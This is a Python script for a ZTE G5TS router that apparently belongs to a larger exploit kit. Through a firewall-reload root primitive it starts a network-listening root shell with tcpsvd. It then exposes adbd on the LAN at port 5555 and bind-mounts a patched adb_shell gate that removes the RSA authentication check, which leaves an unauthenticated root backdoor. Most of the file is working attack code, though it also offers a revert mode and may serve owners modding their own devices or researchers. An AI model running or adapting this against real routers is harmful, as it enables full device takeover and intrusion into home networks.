#!/usr/bin/env python3
"""
ZTE G5TS (firmware BD_MEDGEG5TSV1.0.0B07) — expose adbd to the LAN on 0.0.0.0:5555.

The on-device adbd is normally bound to loopback 127.0.0.1:5037 and gated by
/bin/adb_shell (an RSA challenge). This tool, run from an authenticated admin
session, changes adbd's listen port via the NV property `persist.adb.tcp.port`
and bind-mounts a patched /bin/adb_shell so that `adb shell` yields a root shell
directly over the LAN.

Why not a TCP relay? The device ships a minimal BusyBox (no nc/socat/netcat/
python), so the only practical path is to change the port adbd itself binds.

Execution model
---------------
The firewall-reload root primitive (exploit.py run_root) is racy on some units:
zte_router debounces router_set_remote_acl, so repeated reloads do not re-run
the fw3 include. To be deterministic, this tool first ensures a root shell is
listening (reusing exploit.py's tcpsvd :31337 trick) and then executes every
command over that root shell socket.

Usage:
  python3 adb_lan.py enable    set port 5555 + restart adbd + bypass adb_shell gate
  python3 adb_lan.py disable   revert: clear port + unmount/remove the patch
  python3 adb_lan.py status    show current port binding and gate state

Config (environment), no secrets stored here:
  G5TS_HOST  router address           (default 192.168.0.1)
  G5TS_PW    admin password           (required)
  G5TS_RSHELL_PORT  root shell port  (default 31337, must match exploit.py shell)

Requires rl.py and h.py in the same directory (same as exploit.py).

See docs/ADB_LAN_FORWARD.md for the full write-up.
"""
import base64
import socket
import sys
import time

import h
import rl

ADB_PORT = 5555
NV_KEY = "persist.adb.tcp.port"
GATE_SRC = "/etc_rw/adb_shell"
GATE_DST = "/bin/adb_shell"
RSHELL_PORT = int(__import__("os").environ.get("G5TS_RSHELL_PORT", "31337"))

# Patched gate: drop the adb_switch_no_login RSA check and just run sh.
GATE_PATCH = """#!/bin/sh
export ENV='/etc/adb_profile'
if [ "$1" = '-c' ]; then
  /bin/sh -c "$2"
else
  /bin/sh
fi
"""


# --------------------------------------------------------------------------- #
# Root shell transport
# --------------------------------------------------------------------------- #

def root_shell_open():
    """Return True if a root shell is already listening on :RSHELL_PORT."""
    try:
        s = socket.create_connection((rl.HOST, RSHELL_PORT), timeout=3)
        s.close()
        return True
    except OSError:
        return False


def root_sh(cmd, wait=2.0, timeout=3.0):
    """Run a command over the live root shell and return its raw output."""
    s = socket.create_connection((rl.HOST, RSHELL_PORT), timeout=5)
    s.sendall(cmd.encode() + b"\n")
    time.sleep(wait)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    finally:
        s.close()
    return data.decode("utf-8", "replace")


def strip_prompt(out):
    """Drop the BusyBox banner + prompt noise, keep the useful lines.

    The root shell prints a banner, then a "/ # " prompt. Command output is
    often glued to that first prompt ("/ # 5555"). We drop the banner, strip
    leading prompts, and return the remaining lines.
    """
    lines = []
    for ln in out.splitlines():
        # Drop the banner and standalone prompts.
        if "BusyBox v" in ln:
            continue
        # Strip a leading prompt (possibly glued to output on the same line).
        while ln.startswith("/ # "):
            ln = ln[4:]
        if ln == "/ #":
            continue
        ln = ln.rstrip()
        if not ln:
            continue
        lines.append(ln)
    return "\n".join(lines)


def ensure_root_shell():
    """Make sure a root shell is available; reuse exploit.py's tcpsvd trick."""
    if root_shell_open():
        return True
    print("[*] no root shell on :%d, starting one via firewall include..." % RSHELL_PORT)
    # Best-effort via the run_root primitive; if the reload is debounced this
    # may fail, and the user should run `python3 exploit.py shell` first.
    script = ("tcpsvd -v 0.0.0.0 %d /bin/sh -i </dev/null >/dev/null 2>&1 &\n"
              "sleep 1\n" % RSHELL_PORT)
    h.up("/tmp/back_parameter", script.encode())
    h.ex("cp /tmp/back_parameter /tmp/rc.sh")
    h.ex("chmod 755 /tmp/rc.sh")
    h.u("zwrt_router.api", "router_set_remote_acl",
        {"remote_web_access_enable": 0, "wan_ping_enable": 1, "isTest": 1}, to=25)
    for _ in range(8):
        time.sleep(1.5)
        if root_shell_open():
            return True
    return False


# --------------------------------------------------------------------------- #
# Commands
# --------------------------------------------------------------------------- #

def do_enable():
    print("[*] session:", rl.SESS)
    if not ensure_root_shell():
        print("[!] could not get a root shell on :%d." % RSHELL_PORT)
        print("[!] run `python3 exploit.py shell` first, then retry.")
        return 1

    print("[*] setting NV %s=%d and restarting adbd..." % (NV_KEY, ADB_PORT))
    out = root_sh(
        "nv set %s=%d\n"
        "/etc/init.d/adbd restart\n"
        "sleep 2\n"
        "netstat -ltnp 2>/dev/null | grep -E '5037|5555'\n" % (NV_KEY, ADB_PORT),
        wait=3.0,
    )
    print(strip_prompt(out) or "[!] no output")

    print("[*] writing patched gate and bind-mounting over %s..." % GATE_DST)
    b64 = base64.b64encode(GATE_PATCH.encode()).decode()
    out = root_sh(
        "echo %s | base64 -d > %s\n"
        "chmod 755 %s\n"
        "mount --bind %s %s\n"
        "mount | grep adb_shell\n" % (b64, GATE_SRC, GATE_SRC, GATE_SRC, GATE_DST),
        wait=2.0,
    )
    print(strip_prompt(out) or "[!] no output")

    print("[*] done. From the LAN:  adb connect %s:%d" % (rl.HOST, ADB_PORT))
    print("[*] then:  adb shell   (-> uid=0 root)")
    return 0


def do_disable():
    print("[*] session:", rl.SESS)
    if not ensure_root_shell():
        print("[!] no root shell; nothing to revert.")
        return 1
    print("[*] reverting adbd port and gate bypass...")
    out = root_sh(
        "nv set %s=\n"
        "/etc/init.d/adbd restart\n"
        "umount %s 2>/dev/null\n"
        "rm -f %s\n"
        "sleep 2\n"
        "netstat -ltnp 2>/dev/null | grep -E '5037|5555'\n"
        "echo '--- mounts ---'\n"
        "mount | grep adb_shell || echo '(no adb_shell bind-mount)'\n"
        % (NV_KEY, GATE_DST, GATE_SRC),
        wait=3.0,
    )
    print(strip_prompt(out) or "[!] no output")
    print("[*] reverted. adbd back to loopback 127.0.0.1:5037 (default).")
    return 0


def do_status():
    print("[*] session:", rl.SESS)
    if not ensure_root_shell():
        print("[!] no root shell on :%d (run exploit.py shell first)." % RSHELL_PORT)
        return 1
    out = root_sh(
        "echo '--- NV ---'\n"
        "nv get %s\n"
        "echo '--- listeners ---'\n"
        "netstat -ltnp 2>/dev/null | grep -E '5037|5555' || echo '(none)'\n"
        "echo '--- gate mount ---'\n"
        "mount | grep adb_shell || echo '(no bind-mount; stock gate active)'\n"
        "echo '--- gate content ---'\n"
        "head -5 %s 2>/dev/null\n" % (NV_KEY, GATE_DST),
        wait=2.5,
    )
    print(strip_prompt(out) or "[!] no output")
    return 0


if __name__ == "__main__":
    cmds = {"enable": do_enable, "disable": do_disable, "status": do_status}
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    fn = cmds.get(cmd)
    if fn is None:
        print(__doc__)
        sys.exit(2)
    sys.exit(fn() or 0)
